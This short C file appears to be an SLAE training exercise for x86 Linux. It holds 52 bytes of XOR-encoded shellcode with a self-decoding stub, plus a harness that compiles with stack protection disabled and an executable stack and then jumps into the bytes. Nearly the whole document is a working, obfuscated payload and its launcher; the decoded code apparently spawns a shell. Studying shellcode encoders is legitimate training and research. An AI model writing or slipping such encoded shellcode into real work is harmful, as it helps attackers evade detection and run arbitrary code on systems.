/*

Architecture	: x86
OS		: Linux
Author		: wetw0rk
ID		: SLAE-958
Shellcode Size	: 52 bytes
Description	: This is used to test my custom encoder.
		  nothing too fancy.

Test using:
	gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x14\x5b\x58\x31\xc9\xb1\x19\x31\xd2\x80\x34\x13\xde\xf6"
"\x14\x13\x42\xe2\xf6\xeb\x05\xe8\xe7\xff\xff\xff\x10\xe1\x71"
"\x49\x0e\x0e\x52\x49\x49\x0e\x43\x48\x4f\xa8\xc2\x71\xa8\xc3"
"\x72\xa8\xc0\x91\x2a\xec\xa1";

int main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

